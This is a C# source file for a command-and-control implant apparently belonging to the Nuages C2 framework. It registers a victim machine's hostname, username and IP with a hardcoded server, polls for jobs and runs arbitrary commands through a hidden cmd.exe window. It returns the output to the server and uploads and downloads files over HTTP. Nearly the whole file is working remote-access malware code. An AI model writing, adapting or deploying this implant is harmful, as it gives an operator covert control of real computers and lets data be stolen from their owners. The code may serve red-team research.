﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;

namespace NuagesSharpImplant
{
    public interface NuagesC2Connector
    {
        string getConnectionString();

        string getHandler();

        string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null);

        void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "");

        JArray Heartbeat(string implantId);

        void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream);

        void Stream2Pipe(string pipe_id, Stream stream);

    }


    public class NuagesC2Direct: NuagesC2Connector
    {
        private string connectionString;

        private string handler = "Direct";

        public int refreshrate;

        public int buffersize;

        public NuagesC2Direct(string connectionString, int buffersize, int refreshrate)
        {
            this.connectionString = connectionString;

            this.refreshrate = buffersize;

            this.buffersize = refreshrate;
        }

        public string getConnectionString() {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        string POST(string url, string jsonContent)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";

            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
            Byte[] byteArray = encoding.GetBytes(jsonContent);

            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/json";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }
            
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
                    return reader.ReadToEnd();
                }
            }
        }
        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("moreData", moreData),
                new JProperty("error", error),
                new JProperty("result", result),
                new JProperty("jobId", jobId),
                new JProperty("data", data)
            );
            this.POST(this.connectionString + "/implant/jobresult", body.ToString());
        }

        public string RegisterImplant(string hostname = "", string username = "",  string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
        {
            JObject body = new JObject(
                new JProperty("hostname", hostname),
                new JProperty("username", username),
                new JProperty("localIp", localIp),
                new JProperty("sourceIp", sourceIp),
                new JProperty("os", os),
                new JProperty("handler", handler),
                new JProperty("connectionString", connectionString),
                new JProperty("options", JObject.FromObject(options)),
                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/register", body.ToString()));
            return response["_id"].ToString();
        }

        public JArray Heartbeat(string implantId) {
            JObject body = new JObject(
                new JProperty("id", implantId)
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/heartbeat", body.ToString()));
            return (JArray)response["data"];
        }

        public string GetFileChunk(string fileId, int n) {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("file_id", fileId)
            );

            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/chunks", body.ToString()));
            try
            {
                return response["data"].ToString();
            }
            catch {
                return "";
            }
        }
        public byte[] PipeRead(string pipe_id, int BytesWanted)
        {
            byte[] buffer;
            using (MemoryStream memory = new MemoryStream())
            {
                while (memory.Length < BytesWanted)
                {
                    JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - memory.Length))
                    );
                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"].ToString());
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.refreshrate);
                }
                return memory.ToArray();
            }
        }

        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer;
            while (ReadBytes < BytesWanted)
            {
                JObject body = new JObject(
                new JProperty("pipe_id", pipe_id),
                new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - ReadBytes))
                );
                JObject response = JObject.Parse(this.POST("io", body.ToString()));
                buffer = Convert.FromBase64String(response["out"].ToString());
                ReadBytes += buffer.Length;
                stream.Write(buffer, 0, buffer.Length);
                System.Threading.Thread.Sleep(this.refreshrate);
            }
        }

        public void Stream2Pipe(string pipe_id, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer = new byte[this.buffersize];
            JObject body;
            while ((ReadBytes = stream.Read(buffer, 0, this.buffersize)) > 0)
            {
                if (ReadBytes < this.buffersize)
                {
                    byte[] buffer2 = new byte[ReadBytes];
                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                    new JProperty("in", Convert.ToBase64String(buffer2))
                    );
                }
                else
                {
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                     new JProperty("in", Convert.ToBase64String(buffer))
                    );
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(this.refreshrate);
            }
        }

        public byte[] PipeRead(string pipe_id)
        {
            JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", this.buffersize)
                );
            JObject response = JObject.Parse(this.POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"].ToString());
        }
    }

    public class NuagesC2Implant
    {
        private Dictionary<string, string> config;
        private string hostname;
        private string username;
        private string localIp;
        private string os;
        private string handler;
        private string connectionString;
        private NuagesC2Connector connector;
        private Dictionary<string, string> options;
        String[] supportedPayloads;
        JArray jobs;

        public string GetLocalIPv4()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
        {
            this.jobs = new JArray();

            this.config = config;

            this.connector = connector;

            try
            {
                this.hostname = Dns.GetHostName();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.hostname = "";
            }

            try
            {
                this.localIp = GetLocalIPv4();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.localIp = "";
            }
            try
            {
                this.username = Environment.UserName;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.username = "";
            }

            this.os = "windows";

            this.connectionString = connector.getConnectionString();

            this.supportedPayloads = new string[6];

            this.supportedPayloads[0] = "command";

            this.supportedPayloads[1] = "exit";

            this.supportedPayloads[2] = "download";

            this.supportedPayloads[3] = "upload";

            this.supportedPayloads[4] = "configure";

            this.supportedPayloads[5] = "cd";

            this.handler = connector.getHandler();

            this.options = new Dictionary<string, string>();
        }

        public void Register()
        {
            while (!this.config.ContainsKey("id"))
            {
                try {
                    this.config["id"] = connector.RegisterImplant(hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, options: this.options, supportedPayloads: this.supportedPayloads);
                    System.Threading.Thread.Sleep(1000 * Int32.Parse(this.config["sleep"]));
                }
                catch (Exception e){
                    Console.WriteLine(e);
                    System.Threading.Thread.Sleep(5000);
                }
            }
            return;
        }

        public void Heartbeat() {
            this.jobs = this.connector.Heartbeat(this.config["id"]);
        }

        public void ExecuteJob(JObject job)
        {
            string jobId = job.GetValue("_id").ToString();
            try
            {
                string jobType = job.SelectToken("payload.type").ToString();
                if (jobType == "command")
                {
                    string cmd = job.SelectToken("payload.options.cmd").ToString();
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
                    pProcess.StartInfo.FileName = "cmd.exe";
                    pProcess.StartInfo.Arguments = " /C " + cmd;
                    pProcess.StartInfo.UseShellExecute = false;
                    pProcess.StartInfo.RedirectStandardOutput = true;
                    pProcess.StartInfo.RedirectStandardError = true;
                    pProcess.StartInfo.CreateNoWindow = true;
                    pProcess.Start();
                    string strOutput = pProcess.StandardOutput.ReadToEnd();
                    string strError = pProcess.StandardError.ReadToEnd();
                    pProcess.WaitForExit();
                    bool hasError = (pProcess.ExitCode != 0);
                    string result = strOutput + strError;
                    int n = 0;
                    int maxrequestsize = 5000;
                    try
                    {
                        maxrequestsize = Int32.Parse(this.config["maxrequestsize"]);
                    }
                    catch { }
                    for (n = 0; (n + 1) * maxrequestsize < result.Length; n++)
                    {
                        this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, maxrequestsize), moreData: true, error: hasError, n: n);
                    }
                    this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: hasError, n: n);
                }
                else if (jobType == "cd")
                {
                    string dir = job.SelectToken("payload.options.dir").ToString();
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);

                    Directory.SetCurrentDirectory(dir);

                    string newDir = Directory.GetCurrentDirectory();

                    this.connector.SubmitJobResult(jobId: jobId, result: newDir, moreData: false, error: false);
                }
                else if (jobType == "configure")
                {
                    JObject config = (JObject)job.SelectToken("payload.options.config");
                    foreach (var x in config)
                    {
                        this.config[x.Key] = x.Value.ToString();
                    }
                    SubmitJobResult(jobId: jobId, result: Newtonsoft.Json.JsonConvert.SerializeObject(this.config), moreData: false, error: false);
                }
                else if (jobType == "exit")
                {
                    SubmitJobResult(jobId: jobId, result: "Bye bye!", moreData: false, error: false);
                    System.Environment.Exit(0);
                }
                else if (jobType == "download")
                {
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    string file = job.SelectToken("payload.options.file").ToString();
                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
                    int length = job.SelectToken("payload.options.length").ToObject<int>();
                    string result = "";
                    using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
                    {
                        this.connector.Pipe2Stream(pipe_id, length, fs);
                        result = fs.Name;
                    }
                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
                }
                else if (jobType == "upload")
                {
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    string file = job.SelectToken("payload.options.file").ToString();
                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
                    string result = "";
                    using (FileStream fs = new FileStream(file, System.IO.FileMode.Open))
                    {
                        this.connector.Stream2Pipe(pipe_id, fs);
                        result = fs.Name;
                    }
                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
                }
                else
                {
                    throw new Exception("Payload type not supported");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                SubmitJobResult(jobId: jobId, result: e.Message, moreData: false, error: true);
            }

        }

        private void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            this.connector.SubmitJobResult(jobId: jobId, result: result, moreData: moreData, error: error, n: n, data: data);
        }

        public void Start()
        {
            this.Register();
            int sleep = 5000;
            while (true)
            {
                try
                {
                    try
                    {
                        sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    }
                    catch {
                        sleep = 5000;
                    }
                    System.Threading.Thread.Sleep(sleep);
                    this.Heartbeat();
                    foreach (JObject job in this.jobs)
                    {
                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob(job));
                        thread.Start();
                    }
                }
                catch (WebException ex)
                {
                    Console.WriteLine(ex);
                    if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                    {
                        var resp = (HttpWebResponse)ex.Response;
                        if (resp.StatusCode == HttpStatusCode.NotFound)
                        {
                            this.config.Remove("id");
                            this.Register();
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

        }
    }

    class Program
    {
    static void Main(string[] args)
        {
            // NuagesC2Direct connector = new NuagesC2Direct("http://127.0.0.1:3030", 65536, 100);

            Dictionary<string, string> config = new Dictionary<string, string>();

            config["sleep"] = "1";

            // Buffer size for pipes (file transfers / tcp / interactive)
            config["buffersize"] = "65535";

            // Refreshrate in milliseconds
            config["refreshrate"] = "100";

            // If the PyAES256 Handler is used:
            NuagesC2PyAES256 connector = new NuagesC2PyAES256("http://192.168.49.1:18888", "password", 65536, 100);

            NuagesC2Implant implant = new NuagesC2Implant(config, connector);

            implant.Start();
        }
    }
}
